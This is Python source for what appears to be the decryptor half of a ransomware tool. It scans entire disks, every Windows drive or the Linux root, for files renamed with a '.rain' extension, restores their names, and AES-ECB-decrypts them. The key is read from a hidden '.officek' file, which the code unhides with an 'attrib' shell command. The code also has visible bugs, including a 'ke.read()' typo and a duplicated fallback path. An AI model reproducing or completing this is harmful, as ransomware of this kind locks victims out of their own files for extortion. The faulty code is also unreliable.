import os,platform,glob,string
from Crypto.Cipher import AES
from Crypto import Random
from sys import exit
from os import system as sys

drives = list(string.ascii_uppercase)
s = platform.system()
BLOCK_SIZE = 32
aes = None
k = None

class Decrypt:
	#Fix the extension of a ".rain" file
	def c_ext(filex):
		cnt = 0
		char = []
		try:
			while True:
				with open(filex,'rb') as f_ext:
					f_ext.seek(cnt)
					c = f_ext.read(1)
					if c!=b'.':
						char.append(c)
						cnt=cnt+1
						continue
					else:
						f_ext.close()
						break
			ext = [x.decode('utf-8') for x in char]
			ext = ''.join(ext)
			correct = os.path.splitext(filex)[0]+'.'+ext
			os.rename(filex,correct)
			file = os.path.splitext(filex)[0]+'.'+ext
			with open(file,'rb') as file_rem:
				cnt=cnt+1
				file_rem.seek(cnt)
				s = file_rem.read()
			with open(file,'wb') as file_rem:
				file_rem.write(s)
			return correct
		except:
			pass

	def decrypt(filed):
		#Decrypt a file
		filed = Decrypt.c_ext(filed)
		try:
			with open(filed,'rb') as f_dec:
				c_d = f_dec.read().strip(b'#')
				d_d = aes.decrypt(c_d)
			with open(filed,'wb') as f_dec:
				f_dec.write(d_d)
			with open(filed,'rb') as f_dec:
				s = f_dec.read().strip(b'#')
			with open(filed,'wb') as f_dec:
				f_dec.write(s)
		except:
			pass

	def d_iterator(dirct):
		#An iterator that uses glob to search for files with pre-defined extensions and decrypt them
		iterator = glob.iglob(dirct+'/**/*.rain',recursive=True)
		for file in iterator:
			Decrypt.decrypt(file)

	def cureall():
		"""
		Once you have decrypted the three main directories using "d_iterator" this function is used, 
		which decrypts the rest of the entire disk and ,in Windows, 
		searches for the drives inserted in the machine and continues the process
		"""
		if s=='Windows':
			for drive in drives:
				drive = drive+':/'
				iterator = glob.iglob(drive+'/**/*.rain',recursive=True)
				for file in iterator:
					Decrypt.decrypt(file)
		elif s=='Linux':
			iterator = glob.iglob('//**/*.rain',recursive=True)
			for file in iterator:
				Decrypt.decrypt(file)

	def getkey(documents):
		#Function used to collect the key used for the encryption of files. I think we need a better process.
		global k,aes
		if s=='Windows':
			try:
				sys('attrib -s -h '+documents+'/.officek')
				with open(documents+'/.officek','rb') as key:
					k = key.read()
			except:
				try:
					sys('attrib -s -h C:/Users/Public/.officek')
					with open('C:/Users/Public/.officek','rb') as key:
						k = key.read()
				except:
					exit()
			aes = AES.new(k,AES.MODE_ECB)
			return k
		elif s=='Linux':
			try:
				with open(documents+'/.officek','rb') as key:
					k = key.read()
			except:
				try:
					with open(documents+'/.officek','rb') as key:
						k = ke.read()
				except:
					exit()
			aes = AES.new(k,AES.MODE_ECB)
			return k
